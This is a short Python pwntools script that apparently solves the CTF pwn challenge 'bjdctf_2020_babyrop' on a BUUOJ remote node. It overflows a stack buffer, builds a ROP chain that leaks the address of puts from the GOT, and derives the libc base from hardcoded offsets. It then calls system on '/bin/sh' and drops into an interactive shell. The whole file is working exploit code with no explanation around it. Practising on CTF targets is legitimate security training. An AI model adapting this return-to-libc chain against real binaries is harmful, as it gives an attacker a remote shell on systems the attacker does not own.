from pwn import *


p = remote("node4.buuoj.cn", 25548)
pro = ELF("./bjdctf_2020_babyrop")


puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
start = 0x00400530
pop_rdi_ret = 0x00400733


def leak():
    pad = cyclic(0x20+0x8)
    pad += p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)
    pad += p64(start)
    p.send(pad)
    p.recvuntil("tell me u story!\n")
    info = p.recvuntil("\n", drop=True)

    return info


info = u64(leak().ljust(8, b"\x00"))
print("puts addr: ", hex(info))

# count offset
base = info-0x6f690
system = base+0x45390
binsh = base+0x18cd57

# attack 
pad = cyclic(0x20+0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.send(pad)

p.interactive()


